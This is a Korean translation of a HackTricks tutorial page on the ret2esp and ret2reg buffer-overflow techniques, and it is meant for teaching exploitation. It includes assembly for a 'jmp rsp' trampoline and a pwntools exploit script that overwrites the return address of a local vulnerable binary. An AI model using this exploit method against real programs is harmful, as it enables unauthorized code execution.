# Ret2esp / Ret2reg

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

다른 HackTricks 지원 방법:

- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>

## **Rest2esp**

**ESP (스택 포인터)가 항상 스택의 맨 위를 가리키기 때문에**, 이 기술은 EIP (명령어 포인터)를 **`jmp esp`** 또는 **`call esp`** 명령의 주소로 대체하는 것을 포함합니다. 이렇게 하면 쉘코드가 덮어쓴 EIP 바로 뒤에 배치됩니다. `ret` 명령이 실행될 때 ESP는 다음 주소를 가리키며, 쉘코드가 저장된 정확한 위치가 됩니다.

Windows 또는 Linux에서 **주소 공간 레이아웃 무작위화 (ASLR)**가 비활성화된 경우, 공유 라이브러리에서 찾은 `jmp esp` 또는 `call esp` 명령을 사용할 수 있습니다. 그러나 [**ASLR**](../common-binary-protections-and-bypasses/aslr/)이 활성화된 경우, 취약한 프로그램 자체에서 이러한 명령을 찾아야 할 수 있습니다 ([**PIE**](../common-binary-protections-and-bypasses/pie/)를 우회해야 할 수도 있음).

또한, 쉘코드를 **EIP 손상 이후에** 배치할 수 있기 때문에, 함수의 작동 중에 실행되는 `push` 또는 `pop` 명령이 쉘코드에 간섭하지 않도록 보장됩니다. 쉘코드가 함수 스택의 중간에 배치된 경우 이러한 간섭이 발생할 수 있습니다.

### 공간 부족

RIP를 덮어쓴 후에 쓸 공간이 부족한 경우 (아마도 몇 바이트뿐이라면), 초기 `jmp` 쉘코드를 작성하세요:
```armasm
sub rsp, 0x30
jmp rsp
```
### 예시

스택의 앞부분에 쉘코드를 작성할 수 있습니다.

### 예시

이 기술의 예시를 다음에서 찾을 수 있습니다. [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)와 같은 최종 악용:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

비슷하게, 우리가 함수가 셸코드가 저장된 주소를 반환한다는 것을 알고 있다면, **`call eax`** 또는 **`jmp eax`** 명령어를 활용할 수 있습니다 (**ret2eax** 기술로 알려져 있음), 우리의 셸코드를 실행하는 또 다른 방법을 제공합니다. eax와 마찬가지로, **다른 어떤 레지스터**도 흥미로운 주소를 포함하고 있을 수 있습니다 (**ret2reg**).

### 예시

여기에서 예시를 찾을 수 있습니다: [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## 보호 기능

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): 스택이 실행 불가능하면 셸코드를 스택에 배치하고 실행하기 위해 점프해야 하므로 이것은 도움이 되지 않습니다.
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): 이러한 것들은 esp나 다른 레지스터로 점프할 명령어를 찾기 어렵게 만들 수 있습니다.

## 참고 자료

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)
